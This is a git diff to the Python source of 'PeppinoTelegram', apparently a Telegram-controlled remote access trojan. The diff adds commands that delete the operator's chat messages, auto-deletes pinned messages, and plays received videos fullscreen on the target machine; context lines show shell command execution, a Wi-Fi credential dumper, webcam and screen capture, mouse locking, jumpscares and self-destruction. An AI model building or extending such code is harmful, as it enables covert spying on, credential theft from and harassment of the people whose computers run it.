@@ -286,6 +286,8 @@ mouselock - Locks the mouse in position.
 📋 Messaging
 bsend - Send custom text.
 id - Get Owner Chat ID.
+deletemessages - Deletes the specifed number of messages.
+deleteallmessages - Deletes all the messages in this session.
 
 🔒 Can't Open List
 cantopenadd - Adds process to cantopenlist.
@@ -1065,7 +1067,9 @@ class PeppinoTelegram:
         self.processmonitormenu = None
         self.display_mode_keyboard  = None
         self.wifidumper = WifiDumper()
-        #converts text to functions
+        self.all_session_messages: list[int] = []
+
+        #gets the function from the text
         self.function_table: dict[str:Callable] = {
             "pss":self.pss,
             "psst":self.pss,
@@ -1100,6 +1104,8 @@ class PeppinoTelegram:
             "distortedscreen":self.distorted_screen,
             "displaymode":self.display_mode,
             "jumpscarenoaudio":self.jumpscarenoaudio,
+            "deletemessages":self.deleteallmessages,
+            "deleteallmessages":self.deleteallmessages,
             "getip":self.getip,
             "mouselock":self.mouselock,
             #"keyboardlock":self.keyboardlock,
@@ -1178,7 +1184,9 @@ class PeppinoTelegram:
             return
         try:
             if checkconn():
-                return self.bot.sendMessage(self.owner_id, text, parse_mode=parse_mode, reply_markup=reply_markup)["message_id"]
+                message_id = self.bot.sendMessage(self.owner_id, text, parse_mode=parse_mode, reply_markup=reply_markup)["message_id"]
+                self.all_session_messages.append(message_id)
+                return message_id
             raise ConnectionError
         except Exception as e:
             return self.bsend(text, retries+1)
@@ -1235,6 +1243,18 @@ class PeppinoTelegram:
         }
         self.display_mode_keyboard = self.new_menu(buttons, close_btn_lab="DISPLAYSET_close")
 
+    def delete_message(self, message_id: int) -> None:
+        self.bot.deleteMessage((self.owner_id, message_id))
+
+    def deletemessages(self, number: int = 1) -> None:
+        message_ids = self.all_session_messages[-number:]
+        for message_id in message_ids:
+            self.delete_message(message_id)
+    
+    def deleteallmessages(self) -> None:
+        for message_id in self.all_session_messages:
+            self.delete_message(message_id)
+
     def execute(self, *command, return_output: bool=False) -> None:
         command = " ".join(command)
         s = sp.run(command, stdout=sp.PIPE, stderr=sp.PIPE, encoding="utf-8")
@@ -1264,6 +1284,11 @@ class PeppinoTelegram:
     def handle(self, msg: str) -> None:
         content_type, chat_type, chat_id = glance(msg)
         sender_name = msg["from"]["first_name"] 
+        message_id = msg["message_id"]
+
+        if content_type != "pinned_message":
+            self.all_session_messages.append(message_id)
+
         if chat_id == self.owner_id:
             self.owner_name = sender_name
             if content_type == "text":
@@ -1277,7 +1302,9 @@ class PeppinoTelegram:
             elif content_type in ("voice", "audio"):
                 self.parse_audio(msg)
             elif content_type == "pinned_message":
-                print(msg)
+                self.delete_message(message_id)
+            elif content_type == "video_note":
+                self.parse_document(msg, mimetype="video_note")
             else:
                 self.bsend(f"Unparsed content-type: {content_type}")
         else:
@@ -1385,7 +1412,7 @@ class PeppinoTelegram:
             "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
             "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
         }
-        self.mouse_controller_menu = self.new_menu(menu, label="Mouse Control", rows=3, close_btn_lab="MOUSE_closemenu")
+        self.mouse_controller_menu = self.new_menu(menu, label=f"{emoji_dict['mouse']} Mouse Control", rows=3, close_btn_lab="MOUSE_closemenu")
 
     def moused(self) -> None:
         pos = pg.position()
@@ -1415,13 +1442,19 @@ class PeppinoTelegram:
         bar.fill_and_delete()
 
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
-        return EditableMessage(self.bot, self.owner_id, content, autosend)
+        editable = EditableMessage(self.bot, self.owner_id, content, autosend)
+        self.all_session_messages.append(editable.message_id)
+        return editable
 
     def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
-        return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10) 
+        loadingbar = LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10) 
+        self.all_session_messages.append(loadingbar.ETDMessage.message_id)
+        return loadingbar
 
     def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
-        return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
+        menu = ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
+        self.all_session_messages.append(menu.message_id)
+        return menu
 
     def on_callback_query(self, msg) -> None:
         query_id, from_id, data = glance(msg, flavor="callback_query")
@@ -1549,6 +1582,18 @@ class PeppinoTelegram:
                 remove("tmp.png")
                 self.restore_wallpaper()
 
+        elif mimetype == "video_note":
+            cap = VideoCapture(saved_filepath)
+            while True:
+                ret, frame = cap.read()
+                if not ret:
+                    break
+                imshow("Video", frame)
+                waitKey(25)
+                setWindowProperty("Video", WINDOW_FULLSCREEN, 1)
+            cap.release()
+            destroyAllWindows()
+
     def parse_photo(self, msg: dict) -> None:
         filename = randompngname()
         filepath = join(BURN_DIRECTORY, filename)
@@ -1625,7 +1670,7 @@ class PeppinoTelegram:
         ["/shutdown", "/selfdestruction"],
         ["/altf4", "/clear"],
         ["/fakeshutdown"],
-        ["/ipinfo", "/wifiinfo"],
+        ["/getip", "/wifiinfo"],
         ["/selfie", "/screenshot"],
         ["/webcamclip", "/screenclip"],
         ["/fullclip", "/recordjum"],
@@ -1658,7 +1703,7 @@ class PeppinoTelegram:
 
     def randomkeyboard(self, timeout: int =5) -> None:
         start = time()
-        loading_bar = self.new_loading_bar(timeout, label="Random Keyboard", showperc=True)
+        loading_bar = self.new_loading_bar(timeout, label=f"{emoji_dict['keyboard']} Random Keyboard", showperc=True)
         while (time()-start)<timeout:
             loading_bar.update(time()-start)
             event = read_event()
@@ -2023,7 +2068,7 @@ class PeppinoTelegram:
         self.images = load_images()
         self.update_commands()
         nomemes = list(self.images.copy().keys())
-        self.nomemes = filter(lambda x: not("meme" in x), nomemes)
+        self.nomemes = filter(lambda x: x.startswith("jmp"), nomemes)
         self.audios = load_audios()
         self.backup_wallpaper_path = join(BURN_DIRECTORY, get_current_wallpaper())
 
